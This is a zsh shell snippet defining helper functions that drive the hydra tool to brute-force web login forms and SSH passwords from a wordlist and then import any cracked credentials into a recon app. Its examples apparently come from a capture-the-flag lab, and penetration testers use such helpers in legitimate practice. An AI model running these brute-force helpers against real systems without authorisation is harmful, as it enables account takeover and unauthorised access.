# ========================
# hydra helpers
# ========================

hydraweb() {
  if [[ $# -lt 6 ]]; then
    echo "usage:"
    echo "  hydraweb <target> <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post]"
    echo
    echo "examples:"
    echo "  hydraweb 10.10.10.10 /login.php Rick F \"Invalid username or password\" username password"
    echo "  hydraweb 10.10.10.10 /login.php R1ckR0n43 S \"ingredient\" username password \"sub=Login\""
    echo
    echo "extra_post default: sub=Login  (matches login.php submit button)"
    return 1
  fi

  local target="$1"
  local path="$2"
  local user="$3"
  local mode="$4"
  local text="$5"
  local userfield="$6"
  local passfield="${7:-password}"
  local extra_post="${8:-sub=Login}"

  local form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
  if [[ -n "$extra_post" ]]; then
    form="${form}&${extra_post}"
  fi
  form="${form}:${mode}=${text}"

  echo "[*] hydra form: ${form}"

  /usr/bin/hydra -l "$user" \
    -P "$RECON_PASSLIST" \
    -t 16 -f -V \
    "$target" http-post-form \
    "$form"
}

hydrassh() {
  local target="" user="" wordlist="$RECON_PASSLIST"
  local -a args=("$@")

  if [[ $# -lt 1 ]]; then
    echo "usage: hydrassh [target] <user> [wordlist]"
    echo "  default wordlist: \$RECON_PASSLIST"
    echo "  omit target when \$IP is set (target-set <ip>)"
    return 1
  fi

  # zsh arrays are 1-based; do not use $# here (it is the function's argc, not args length)
  if [[ -n "${args[-1]}" && -f "${args[-1]:A}" ]]; then
    wordlist="${args[-1]:A}"
    if (( ${#args[@]} > 1 )); then
      args=("${args[1,-2]}")
    else
      args=()
    fi
  fi

  if [[ ${#args[@]} -ge 2 && "${args[1]}" =~ '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' ]]; then
    target="${args[1]}"
    user="${args[2]}"
  elif [[ ${#args[@]} -eq 2 ]]; then
    target="${args[1]}"
    user="${args[2]}"
  elif [[ ${#args[@]} -eq 1 ]]; then
    target="${IP:-}"
    user="${args[1]}"
  else
    echo "usage: hydrassh [target] <user> [wordlist]"
    return 1
  fi

  if [[ -z "$target" || -z "$user" ]]; then
    echo "usage: hydrassh [target] <user> [wordlist]  (or: target-set <ip> first)"
    return 1
  fi

  if [[ ! -f "$wordlist" ]]; then
    echo "wordlist not found: $wordlist"
    return 1
  fi

  echo "[*] target: ssh://$target  user: $user"
  echo "[*] wordlist: $wordlist"

  local log rc
  log="$(mktemp "${TMPDIR:-/tmp}/hydrassh.XXXXXX")"
  trap 'rm -f "$log"' EXIT INT TERM

  hydra -l "$user" \
    -P "$wordlist" \
    -t 32 -f -V \
    ssh://"$target" 2>&1 | tee "$log"
  rc=${pipestatus[1]}

  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"

  return $rc
}
